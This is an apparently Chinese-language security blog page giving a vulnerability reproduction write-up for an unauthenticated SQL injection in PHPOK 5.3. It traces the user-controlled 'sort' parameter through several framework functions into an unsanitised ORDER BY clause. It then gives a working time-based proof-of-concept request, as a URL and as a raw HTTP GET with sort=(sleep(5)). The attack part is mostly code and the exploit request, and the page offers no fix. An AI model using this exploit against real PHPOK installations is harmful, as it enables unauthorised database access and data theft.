<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="PHPOK 5.3 前台无限制注入一、漏洞简介二、漏洞影响PHPOK 5.3 三、复现过程漏洞分析注入点：framework&#x2F;model&#x2F;list.php#arc_all public function arc_all($project,$condition&#x3D;&#39;&#39;,$field&#x3D;&#39;*&#39;,$offset&#x3D;0,$psize&#x3D;0,$orderby&#x3D;&#39;&#39;)">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="PHPOK 5.3 前台无限制注入一、漏洞简介二、漏洞影响PHPOK 5.3 三、复现过程漏洞分析注入点：framework&#x2F;model&#x2F;list.php#arc_all public function arc_all($project,$condition&#x3D;&#39;&#39;,$field&#x3D;&#39;*&#39;,$offset&#x3D;0,$psize&#x3D;0,$orderby&#x3D;&#39;&#39;)">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:26:02.223Z">
<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-PHPOK/PHPOK 5.3 前台无限制注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2022-07-08T06:26:02.223Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PHPOK-5-3-前台无限制注入"><a href="#PHPOK-5-3-前台无限制注入" class="headerlink" title="PHPOK 5.3 前台无限制注入"></a>PHPOK 5.3 前台无限制注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PHPOK 5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>注入点：framework/model/list.php#arc_all</p>
<pre><code>public function arc_all($project,$condition=&#39;&#39;,$field=&#39;*&#39;,$offset=0,$psize=0,$orderby=&#39;&#39;)
    &#123;
        if($this-&gt;_total &gt; 100000 &amp;&amp; $offset &gt; 10000)&#123;
            return $this-&gt;_arc_all($project,$condition,$field,$offset,$psize,$orderby);
        &#125;
        $sql  = &quot; SELECT &quot;.$field.&quot; FROM &quot;.$this-&gt;db-&gt;prefix.&quot;list l &quot;;
        $sql .= &quot; JOIN &quot;.$this-&gt;db-&gt;prefix.&quot;list_&quot;.$project[&#39;module&#39;].&quot; ext &quot;;
        $sql .= &quot; ON(l.id=ext.id AND l.site_id=ext.site_id AND l.project_id=ext.project_id) &quot;;
        if($project[&#39;is_biz&#39;])&#123;
            $sql .= &quot; LEFT JOIN &quot;.$this-&gt;db-&gt;prefix.&quot;list_biz b ON(b.id=l.id) &quot;;
        &#125;
        if($project[&#39;cate&#39;] &amp;&amp; $project[&#39;cate_multiple&#39;])&#123;
            $sql.= &quot; LEFT JOIN &quot;.$this-&gt;db-&gt;prefix.&quot;list_cate lc ON(l.id=lc.id) &quot;;
        &#125;
        if($condition)&#123;
            $sql .= &quot; WHERE &quot;.$condition.&quot; &quot;;
        &#125;
        // 拼接$orderby参数
        if($orderby)&#123;
            $sql .= &quot; ORDER BY &quot;.$orderby.&quot; &quot;;
        &#125;
        if($psize)&#123;
            $sql .= &quot; LIMIT &quot;.intval($offset).&quot;,&quot;.$psize;
        &#125;
        //注入
        $rslist = $this-&gt;db-&gt;get_all($sql,&#39;id&#39;);
        if(!$rslist)&#123;
            return false;
        &#125;
        return $this-&gt;_arc_list_format($rslist,$project);
    &#125;
回溯寻找调用链：framework/phpok_call.php#_arclist

private function _arclist($rs,$cache_id=&#39;&#39;)
&#123;
    // 264行
    $orderby = $rs[&#39;orderby&#39;] ? $rs[&#39;orderby&#39;] : $project[&#39;orderby&#39;];

    // 270行 调用arc_all函数，将$orderby传入
    $rslist = $this-&gt;model(&#39;list&#39;)-&gt;arc_all($project,$condition,$field,$offset,$psize,$orderby);
</code></pre>
<p>回溯：framework/api/project_control.php#load_module</p>
<pre><code>private function load_module($rs,$parent_rs=&#39;&#39;)
&#123;
    // 91行
    $keywords = $this-&gt;get(&quot;keywords&quot;);
    $ext = $this-&gt;get(&quot;ext&quot;);
    $tag = $this-&gt;get(&quot;tag&quot;);
    $uid = $this-&gt;get(&#39;uid&#39;,&#39;int&#39;);
    $attr = $this-&gt;get(&#39;attr&#39;);
    //价格，支持价格区间
    $price = $this-&gt;get(&#39;price&#39;,&#39;float&#39;);
    $sort = $this-&gt;get(&#39;sort&#39;);

    //186行
    if($sort)&#123;
        $dt[&#39;orderby&#39;] = $sort;  // 可控
        $pageurl .= &#39;&amp;sort=&#39;.rawurlencode($sort);
        $this-&gt;rlist[&#39;sort&#39;] = $sort;
    &#125;
    // 208行，通过phpok函数动态调用_arclist()函数
        $info = $this-&gt;call-&gt;phpok(&#39;_arclist&#39;,$dt);
</code></pre>
<p>继续回溯，找谁调用了load_module()：framework/api/project_control.php#index_f</p>
<pre><code>public function index_f()
&#123;
    //65行
        if($project[&quot;module&quot;])&#123;
        $this-&gt;load_module($project,$parent_rs);
    &#125;
&#125;
</code></pre>
<p>在控制器里以_f结尾的函数都可以直接被调用</p>
<p>构造poc:</p>
<pre><code>http://0-sec.org/api.php?c=project&amp;f=index&amp;token=1234&amp;id=news&amp;sort=(sleep(5))
</code></pre>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>poc</p>
<pre><code>GET /api.php?c=project&amp;f=index&amp;token=1234&amp;id=news&amp;sort=(sleep(5)) HTTP/1.1
Host: phpok5_3_147
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3833.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSION=l87bngd1u307g20iudfmphisu4; XDEBUG_SESSION=PHPSTORM
Connection: close
</code></pre>
<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6831">https://xz.aliyun.com/t/6831</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/" data-id="cl5c2quih00ery8v1fhqq6us7" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Phpmyadmin/%EF%BC%88WooYun-2016-1994%EF%BC%89Phpmyadmin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>